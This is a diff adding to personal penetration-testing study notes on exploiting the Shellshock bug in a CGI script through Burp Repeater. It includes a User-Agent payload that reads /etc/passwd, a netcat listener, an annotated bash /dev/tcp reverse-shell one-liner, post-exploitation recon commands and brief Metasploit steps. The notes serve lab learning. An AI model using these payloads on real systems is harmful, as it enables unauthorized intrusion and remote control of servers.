@@ -48,11 +48,26 @@ Shellshock Exploration:
 	- go to proxy and make sure intercept is on 
 	- make get request to cgi script in browser 
 	- send incoming get request in burp to repeater 
-		- in repeater get rid of user-agent and replace them with own characters: () {   :;    } ; echo;   echo;  /bin/bash -c 'cat   /etc/passwd'![[Pasted image 20230710133404.png]] ![[Pasted image 20230710133525.png]]  
- 
+		- in repeater get rid of user-agent and replace them with own characters: () {   :;    } ; echo;   echo;  /bin/bash -c 'cat   /etc/passwd'![[Pasted image 20230710133404.png]] ![[Pasted image 20230710133525.png]]
+- gain a reverse shell on the target system 
+	- set up a listener with netcat: nc -nvlp 1234 
+	- open in burp: 'bash -i>&/dev/tcp/your-kali-ip/port-listner 0>&1' ![[Pasted image 20230710141925.png]]
+		- - `bash -i`: This starts an interactive Bash shell with the `-i` option, allowing for interactive input/output. the main difference between interactive (`-i`) and non-interactive modes in Bash is the level of interactivity and the availability of certain features within the shell session. Interactive mode provides a more interactive and dynamic shell environment, while non-interactive mode is typically used for running scripts or commands that don't require user interaction.
+		- `>&/dev/tcp/your-kali-ip/port-listener`: This redirects both the standard output and standard error streams to a TCP connection established with the specified IP address and port. You need to replace `your-kali-ip` with the actual IP address of your Kali machine, and `port-listener` with the desired port number for the listener.
+		- `0>&1`: This redirects the standard input (file descriptor 0) to the standard output (file descriptor 1). `, it means we are redirecting the input of the command to the same place where the output is going.
+	- Now you have a reverse shell
+		- Run whoami 
+		- cat /etc/\*issue 
+		- uname -a 
 
-
-
+How do we exploit this vulnerability in metasploit? 
+- msfconsole 
+- search shellshock 
+	- we have aux module and exploit module 
+	- use exploit and specify the options including path to cgi script 
+	- you have meterpreter session 
+		- sysinfo 
+		- elevate privilege's 
 
 
 
